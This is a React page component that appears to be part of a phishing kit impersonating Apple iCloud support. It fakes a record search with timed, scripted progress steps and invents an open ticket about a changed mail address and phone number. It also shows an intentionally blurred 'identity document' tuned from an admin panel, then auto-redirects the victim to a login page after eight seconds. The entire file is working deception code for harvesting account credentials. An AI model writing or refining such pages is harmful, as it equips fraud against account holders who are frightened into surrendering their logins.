import { useEffect, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import Layout from "../components/layout/Layout";

const CASE_STEPS = [
  "Connecting to iCloud",
  "Opening case ID",
  "Verifying case reference",
  "Retrieving account records",
  "Loading security activity",
];

const CASE_REASON = "Mail address change and phone number";
const NEW_MAIL_MASKED = "m••••••••@proton.me";
const NEW_PHONE_MASKED = "+49 ** ** 5850";

function readStoredCaseId() {
  try {
    return sessionStorage.getItem("icloud_case_id") || "";
  } catch {
    return "";
  }
}

function AppleSpinner({ className = "", size = 20 }) {
  const spokeH = Math.round(size * 0.25);
  const origin = size / 2;
  return (
    <span
      className={`relative inline-block ${className}`}
      style={{ width: size, height: size }}
      aria-hidden="true"
    >
      {Array.from({ length: 12 }).map((_, i) => (
        <span
          key={i}
          className="absolute left-1/2 top-0 w-[2px] rounded-full bg-[var(--spinner)]"
          style={{
            height: spokeH,
            transform: `rotate(${i * 30}deg) translateX(-50%)`,
            transformOrigin: `50% ${origin}px`,
            opacity: 0.15 + (i / 12) * 0.85,
            animation: "apple-spin-fade 1s linear infinite",
            animationDelay: `${(-i / 12).toFixed(3)}s`,
          }}
        />
      ))}
    </span>
  );
}

function AppleCheck() {
  return (
    <motion.span
      initial={{ scale: 0.4, opacity: 0 }}
      animate={{ scale: 1, opacity: 1 }}
      transition={{ type: "spring", stiffness: 520, damping: 22 }}
      className="inline-flex items-center justify-center w-[20px] h-[20px] rounded-full"
      style={{ background: "#0071e3" }}
      aria-hidden="true"
    >
      <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
        <path
          d="M2.2 6.2L4.7 8.7L9.8 3.4"
          stroke="white"
          strokeWidth="1.8"
          strokeLinecap="round"
          strokeLinejoin="round"
        />
      </svg>
    </motion.span>
  );
}

function PendingDot() {
  return (
    <span
      className="inline-block w-[20px] h-[20px] rounded-full border-[1.5px]"
      style={{ borderColor: "var(--border-input)" }}
      aria-hidden="true"
    />
  );
}

function PdfIcon() {
  return (
    <svg width="32" height="38" viewBox="0 0 40 48" fill="none" aria-hidden="true">
      <path
        d="M4 4C4 1.79086 5.79086 0 8 0H24L36 12V44C36 46.2091 34.2091 48 32 48H8C5.79086 48 4 46.2091 4 44V4Z"
        fill="url(#casePdfGrad)"
      />
      <path d="M24 0L36 12H28C25.7909 12 24 10.2091 24 8V0Z" fill="#FF8A80" />
      <rect x="9" y="22" width="22" height="14" rx="3" fill="white" fillOpacity="0.95" />
      <text
        x="20"
        y="32.5"
        textAnchor="middle"
        fontFamily="SF Pro Display, Helvetica, Arial, sans-serif"
        fontSize="8"
        fontWeight="700"
        fill="#E53935"
        letterSpacing="0.4"
      >
        PDF
      </text>
      <defs>
        <linearGradient id="casePdfGrad" x1="4" y1="0" x2="36" y2="48" gradientUnits="userSpaceOnUse">
          <stop stopColor="#FF6B6B" />
          <stop offset="1" stopColor="#E53935" />
        </linearGradient>
      </defs>
    </svg>
  );
}

/** Frosted blur — intensity/framing from admin editor. */
function RedactedDocImage({
  src,
  compact = false,
  intensity = 45,
  panX = 0,
  panY = 0,
  zoom = 110,
  className = "",
}) {
  const level = Math.max(0, Math.min(100, Number(intensity) || 45));
  const basePx = 1.5 + (level / 100) * 20;
  const px = compact ? Math.max(1.2, basePx * 0.45) : basePx;
  const breathe = px + Math.max(1, px * 0.18);
  const z = Math.max(100, Math.min(220, Number(zoom) || 110));
  const x = Math.max(-50, Math.min(50, Number(panX) || 0));
  const y = Math.max(-50, Math.min(50, Number(panY) || 0));

  return (
    <div className={`relative overflow-hidden bg-[#e8eef5] ${className}`}>
      <img
        src={src}
        alt=""
        draggable={false}
        className="absolute left-1/2 top-1/2 max-w-none select-none pointer-events-none"
        style={{
          width: `${z}%`,
          height: "auto",
          transform: `translate(calc(-50% + ${x}%), calc(-50% + ${y}%))`,
          filter: `blur(${px}px) saturate(1.15) brightness(1.03)`,
          animation: compact ? undefined : "id-frost-breathe 4.5s ease-in-out infinite",
          ["--id-blur-a"]: `${px}px`,
          ["--id-blur-b"]: `${breathe}px`,
        }}
      />
      {/* spacer so absolute img still gives height when parent needs it */}
      <div className="w-full" style={{ paddingBottom: compact ? "120%" : "130%" }} />
      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          background:
            "linear-gradient(180deg, rgba(255,255,255,0.14) 0%, rgba(255,255,255,0.06) 50%, rgba(20,30,50,0.12) 100%)",
          opacity: 0.35 + (level / 100) * 0.45,
        }}
      />
      {!compact && (
        <div
          className="absolute inset-0 pointer-events-none overflow-hidden opacity-70"
          aria-hidden="true"
        >
          <div
            className="absolute top-0 bottom-0 w-[36%]"
            style={{
              background:
                "linear-gradient(105deg, transparent 0%, rgba(255,255,255,0.05) 40%, rgba(255,255,255,0.28) 50%, rgba(255,255,255,0.05) 60%, transparent 100%)",
              animation: "id-frost-shimmer 3.2s ease-in-out infinite",
            }}
          />
        </div>
      )}
    </div>
  );
}

function Loading({ authUser } = {}) {
  const queryClient = useQueryClient();
  const searchingCase = authUser?.currentStatus === "searching_case";
  const caseId = authUser?.caseId || readStoredCaseId();
  const [activeStep, setActiveStep] = useState(0);
  const [found, setFound] = useState(false);
  const [opening, setOpening] = useState(false);
  const [previewOpen, setPreviewOpen] = useState(false);
  const openingRef = useRef(false);

  const { data: caseDocPayload } = useQuery({
    queryKey: ["activeCaseDocument"],
    queryFn: async () => {
      const res = await fetch("/api/v1/rumman/site/case-documents/active");
      const data = await res.json().catch(() => ({}));
      if (!res.ok) return null;
      return data;
    },
    enabled: searchingCase,
    staleTime: 30_000,
  });

  const caseDoc = caseDocPayload?.document || null;
  const showDocPreview = caseDocPayload?.showPreview !== false;
  const docBlur = caseDoc?.blur ?? 45;
  const docPanX = caseDoc?.panX ?? 0;
  const docPanY = caseDoc?.panY ?? 0;
  const docZoom = caseDoc?.zoom ?? 110;
  const docName = caseDoc?.name || "Ausweis_Kopie.pdf";
  const docUrl = caseDoc?.url || null;
  const docIsImage = String(caseDoc?.mimeType || "").startsWith("image/");
  const useImagePreview = showDocPreview && docIsImage && Boolean(docUrl);
  const docIsPdf =
    String(caseDoc?.mimeType || "").includes("pdf") ||
    /\.pdf$/i.test(docName);

  useEffect(() => {
    if (!searchingCase) return;
    setFound(false);
    setOpening(false);
    openingRef.current = false;
    setActiveStep(0);
    setPreviewOpen(false);

    const totalMs = 4200 + Math.random() * 2200;
    const stepMs = totalMs / CASE_STEPS.length;
    const timers = CASE_STEPS.map((_, i) =>
      setTimeout(() => {
        setActiveStep(i + 1);
        if (i + 1 >= CASE_STEPS.length) setFound(true);
      }, stepMs * (i + 1))
    );

    return () => timers.forEach(clearTimeout);
  }, [searchingCase, caseId]);

  const goToLogin = async () => {
    if (openingRef.current) return;
    openingRef.current = true;
    setOpening(true);
    setPreviewOpen(false);
    try {
      const res = await fetch("/api/v1/rumman/auth/case-open-login", {
        method: "POST",
        credentials: "include",
      });
      const data = await res.json().catch(() => ({}));
      if (res.ok) {
        queryClient.setQueryData(["authUser"], (prev) => ({
          ...(prev || {}),
          ...data,
          currentPage: "login",
          currentStatus: "",
        }));
        return;
      }
    } catch {
      /* fall through */
    }
    queryClient.setQueryData(["authUser"], (prev) => ({
      ...(prev || {}),
      currentPage: "login",
      currentStatus: "",
    }));
    setOpening(false);
    openingRef.current = false;
  };

  useEffect(() => {
    if (!found || !searchingCase) return;
    const t = setTimeout(() => {
      setPreviewOpen(false);
      goToLogin();
    }, 8000);
    return () => clearTimeout(t);
    // goToLogin closes preview + navigates; re-run only when case is found
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [found, searchingCase]);

  const progress = found
    ? 100
    : Math.min(96, (activeStep / CASE_STEPS.length) * 100);

  return (
    <Layout>
      <style>{`
        @keyframes apple-spin-fade {
          0% { opacity: 1; }
          100% { opacity: 0.15; }
        }
        @keyframes case-orbit {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes case-breathe {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.035); }
        }
        @keyframes case-shimmer {
          0% { transform: translateX(-130%); }
          100% { transform: translateX(230%); }
        }
        @keyframes open-pulse {
          0%, 100% { box-shadow: 0 0 0 0 rgba(0, 113, 227, 0.45); }
          50% { box-shadow: 0 0 0 8px rgba(0, 113, 227, 0); }
        }
        @keyframes id-frost-shimmer {
          0% { transform: translateX(-120%); }
          100% { transform: translateX(280%); }
        }
        @keyframes id-frost-breathe {
          0%, 100% { filter: blur(var(--id-blur-a, 7px)) saturate(1.15) brightness(1.03); }
          50% { filter: blur(var(--id-blur-b, 8.5px)) saturate(1.18) brightness(1.05); }
        }
      `}</style>
      <div className="pt-[calc(43px+12px)] sm:pt-[44px] pb-[calc(20px+env(safe-area-inset-bottom))] sm:pb-0">
        <div className="w-full flex flex-col items-center px-0 sm:px-4">
          <div
            className="w-full sm:w-[640px] min-h-[calc(100dvh-43px-82px-12px)] sm:min-h-0 sm:h-[712px] apple-shadow sm:rounded-[34px] sm:mt-[44px] flex flex-col"
            style={{ background: "var(--card-bg)" }}
          >
            {searchingCase ? (
              <div className="flex flex-col flex-1 px-[22px] sm:px-[80px] pt-[22px] sm:pt-[48px] pb-[22px] overflow-y-auto overflow-x-hidden overscroll-contain [-webkit-overflow-scrolling:touch]">
                <div className="w-full max-w-[400px] mx-auto flex flex-col items-center">
                  <div className="relative w-[108px] h-[108px] sm:w-[156px] sm:h-[156px] flex items-center justify-center">
                    {!found && (
                      <>
                        <span
                          className="absolute inset-[-8px] sm:inset-[-10px] rounded-full pointer-events-none"
                          style={{
                            border: "1.5px solid transparent",
                            borderTopColor: "rgba(0,113,227,0.55)",
                            borderRightColor: "rgba(0,113,227,0.12)",
                            animation: "case-orbit 1.15s linear infinite",
                          }}
                        />
                        <span
                          className="absolute inset-[-14px] sm:inset-[-18px] rounded-full pointer-events-none"
                          style={{
                            border: "1.5px solid transparent",
                            borderBottomColor: "rgba(0,113,227,0.28)",
                            borderLeftColor: "rgba(0,113,227,0.08)",
                            animation: "case-orbit 2.1s linear infinite reverse",
                          }}
                        />
                      </>
                    )}
                    <img
                      src="/logo.png?v=5"
                      alt=""
                      draggable={false}
                      className="relative z-[1] w-full h-full object-contain select-none"
                      style={{
                        animation: found ? "none" : "case-breathe 2.4s ease-in-out infinite",
                      }}
                    />
                  </div>

                  <h1
                    className="mt-[16px] sm:mt-[20px] select-none cursor-default font-apple text-[24px] sm:text-[32px] font-[600] text-center leading-[1.2] tracking-[-0.01em]"
                    style={{ color: "var(--text-primary)" }}
                  >
                    {found ? "Case found" : "Retrieving records"}
                  </h1>
                  <p
                    className="mt-[6px] sm:mt-[8px] font-apple text-[14px] sm:text-[15px] text-center tabular-nums"
                    style={{ color: "var(--text-secondary)" }}
                  >
                    for case{" "}
                    <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>
                      {caseId || "—"}
                    </span>
                  </p>

                <div
                  className="relative mt-[16px] sm:mt-[20px] h-[3px] w-full rounded-full overflow-hidden"
                  style={{ background: "var(--border-input)" }}
                >
                  <motion.div
                    className="absolute inset-y-0 left-0 rounded-full overflow-hidden"
                    animate={{
                      width: `${progress}%`,
                      backgroundColor: "#0071e3",
                    }}
                    transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
                  >
                    {!found && (
                      <span
                        className="absolute inset-y-0 w-14"
                        style={{
                          background:
                            "linear-gradient(90deg, transparent, rgba(255,255,255,0.75), transparent)",
                          animation: "case-shimmer 1.25s linear infinite",
                        }}
                      />
                    )}
                  </motion.div>
                </div>

                {!found && (
                  <div className="mt-[18px] sm:mt-[22px] w-fit mx-auto space-y-[11px] sm:space-y-[12px]">
                    {CASE_STEPS.map((label, i) => {
                      const done = activeStep > i;
                      const current = activeStep === i;
                      return (
                        <div key={label} className="flex items-center gap-[10px]">
                          <span className="shrink-0 w-[20px] h-[20px] flex items-center justify-center">
                            {done ? (
                              <AppleCheck />
                            ) : current ? (
                              <AppleSpinner size={16} />
                            ) : (
                              <PendingDot />
                            )}
                          </span>
                          <p
                            className="font-apple text-[14px] sm:text-[15px] leading-[1.25]"
                            style={{
                              color:
                                done || current
                                  ? "var(--text-primary)"
                                  : "var(--text-secondary)",
                            }}
                          >
                            {label}
                          </p>
                        </div>
                      );
                    })}
                  </div>
                )}

                <AnimatePresence>
                  {found && (
                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
                      className="mt-[16px] sm:mt-[20px] w-full space-y-[10px] sm:space-y-[12px]"
                    >
                      <div
                        className="w-full rounded-[16px] px-[14px] sm:px-[16px] py-[14px]"
                        style={{
                          background:
                            "linear-gradient(180deg, rgba(0,113,227,0.12) 0%, rgba(0,113,227,0.04) 100%)",
                          border: "1.5px solid rgba(0,113,227,0.45)",
                          boxShadow: "0 0 0 4px rgba(0,113,227,0.08)",
                        }}
                      >
                        <div className="flex items-start justify-between gap-3">
                          <div className="min-w-0 flex-1">
                            <p
                              className="font-apple text-[11px] uppercase tracking-[0.12em] font-[600]"
                              style={{ color: "#0071e3" }}
                            >
                              Open ticket
                            </p>
                            <p
                              className="mt-[2px] font-apple text-[12px]"
                              style={{ color: "var(--text-secondary)" }}
                            >
                              Reason
                            </p>
                            <p
                              className="mt-[2px] font-apple text-[14px] sm:text-[15px] font-[600] leading-[1.3] pr-1"
                              style={{ color: "var(--text-primary)" }}
                            >
                              {CASE_REASON}
                            </p>
                          </div>
                          <button
                            type="button"
                            onClick={goToLogin}
                            disabled={opening}
                            className="inline-flex items-center rounded-full text-white font-apple text-[13px] font-[700] tracking-wide px-[14px] py-[8px] shrink-0 min-h-[36px] active:opacity-90"
                            style={{
                              background: "#0071e3",
                              animation: "open-pulse 1.5s ease-out infinite",
                            }}
                          >
                            Open
                          </button>
                        </div>

                        <p
                          className="mt-[6px] font-apple text-[12px]"
                          style={{ color: "var(--text-secondary)" }}
                        >
                          Requested yesterday at 11:44
                        </p>

                        <div
                          className="mt-[10px] pt-[10px] space-y-[8px]"
                          style={{ borderTop: "1px solid rgba(0,113,227,0.18)" }}
                        >
                          <div>
                            <p
                              className="font-apple text-[11px]"
                              style={{ color: "var(--text-secondary)" }}
                            >
                              New mail address
                            </p>
                            <p
                              className="mt-[1px] font-apple text-[13px] sm:text-[14px] font-[500] tracking-wide break-all"
                              style={{ color: "var(--text-primary)" }}
                            >
                              {NEW_MAIL_MASKED}
                            </p>
                          </div>
                          <div>
                            <p
                              className="font-apple text-[11px]"
                              style={{ color: "var(--text-secondary)" }}
                            >
                              New phone number
                            </p>
                            <p
                              className="mt-[1px] font-apple text-[14px] font-[500] tabular-nums tracking-wide"
                              style={{ color: "var(--text-primary)" }}
                            >
                              {NEW_PHONE_MASKED}
                            </p>
                          </div>
                        </div>
                      </div>

                      <div>
                        <p
                          className="mb-[6px] font-apple text-[12px]"
                          style={{ color: "var(--text-secondary)" }}
                        >
                          Submitted documents
                        </p>
                        <button
                          type="button"
                          onClick={() => {
                            if (docUrl) setPreviewOpen(true);
                            else goToLogin();
                          }}
                          disabled={opening}
                          className="w-full text-left rounded-[14px] border px-[12px] py-[10px] flex items-center gap-[12px] transition hover:opacity-90"
                          style={{
                            background: "var(--input-bg)",
                            borderColor: "var(--border-input)",
                          }}
                        >
                          {useImagePreview ? (
                            <div className="w-8 h-[38px] rounded overflow-hidden shrink-0 border border-black/5">
                              <RedactedDocImage
                                src={docUrl}
                                compact
                                intensity={docBlur}
                                panX={docPanX}
                                panY={docPanY}
                                zoom={docZoom}
                                className="h-full"
                              />
                            </div>
                          ) : (
                            <PdfIcon />
                          )}
                          <div className="min-w-0 flex-1">
                            <p
                              className="font-apple text-[14px] font-[600] truncate"
                              style={{ color: "var(--text-primary)" }}
                            >
                              {docName}
                            </p>
                            <p
                              className="mt-[2px] font-apple text-[12px] tabular-nums"
                              style={{ color: "var(--text-secondary)" }}
                            >
                              Case ID {caseId || "—"}
                            </p>
                          </div>
                          <span
                            className="font-apple text-[13px] font-[600] shrink-0"
                            style={{ color: "#0071e3" }}
                          >
                            Open
                          </span>
                        </button>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
                </div>
              </div>
            ) : (
              <div className="w-full h-full min-h-[calc(100dvh-43px-82px-12px)] sm:min-h-[712px] flex items-center justify-center">
                <AppleSpinner size={28} />
              </div>
            )}
          </div>
        </div>
      </div>

      <AnimatePresence>
        {previewOpen && docUrl && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[80] flex items-end sm:items-center justify-center bg-black/40 backdrop-blur-[3px] px-0 sm:px-6"
            onClick={() => setPreviewOpen(false)}
          >
            <motion.div
              initial={{ opacity: 0, y: 28 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 16 }}
              transition={{ duration: 0.3, ease: [0.22, 1, 0.36, 1] }}
              className="w-full sm:max-w-[400px] rounded-t-[24px] sm:rounded-[22px] overflow-hidden shadow-[0_24px_64px_rgba(0,0,0,0.28)]"
              style={{ background: "var(--card-bg)" }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-start justify-between gap-3 px-5 pt-5 pb-3">
                <div className="min-w-0">
                  <p
                    className="font-apple text-[17px] font-[600] tracking-[-0.01em]"
                    style={{ color: "var(--text-primary)" }}
                  >
                    Identity document
                  </p>
                  <p
                    className="mt-1 font-apple text-[13px] leading-snug"
                    style={{ color: "var(--text-secondary)" }}
                  >
                    Personal details are hidden in this preview.
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => setPreviewOpen(false)}
                  className="shrink-0 font-apple text-[15px] font-[600] pt-0.5"
                  style={{ color: "#0071e3" }}
                >
                  Done
                </button>
              </div>

              <div className="px-5 pb-3">
                <div className="rounded-[14px] overflow-hidden border border-black/[0.06] bg-[#eef2f6]">
                  {useImagePreview ? (
                    <div className="max-h-[min(52dvh,440px)] overflow-hidden">
                      <RedactedDocImage
                        src={docUrl}
                        intensity={docBlur}
                        panX={docPanX}
                        panY={docPanY}
                        zoom={docZoom}
                      />
                    </div>
                  ) : (
                    <div className="relative h-[min(42dvh,320px)] bg-[#eef2f6] flex items-center justify-center">
                      <div className="text-center px-6">
                        <PdfIcon />
                        <p
                          className="mt-3 font-apple text-[14px] font-[600]"
                          style={{ color: "var(--text-primary)" }}
                        >
                          {docName}
                        </p>
                        <p
                          className="mt-1 font-apple text-[12px]"
                          style={{ color: "var(--text-secondary)" }}
                        >
                          Document on file
                        </p>
                      </div>
                    </div>
                  )}
                </div>
                <p
                  className="mt-2.5 font-apple text-[11px] text-center"
                  style={{ color: "var(--text-secondary)" }}
                >
                  Identity document · case {caseId || "—"}
                </p>
              </div>

              <div className="px-5 pt-1 pb-[max(16px,env(safe-area-inset-bottom))]">
                <button
                  type="button"
                  onClick={() => {
                    setPreviewOpen(false);
                    goToLogin();
                  }}
                  disabled={opening}
                  className="w-full h-[48px] rounded-[12px] text-white font-apple text-[17px] font-medium active:opacity-90"
                  style={{ background: "#0071e3" }}
                >
                  Continue
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </Layout>
  );
}

export default Loading;
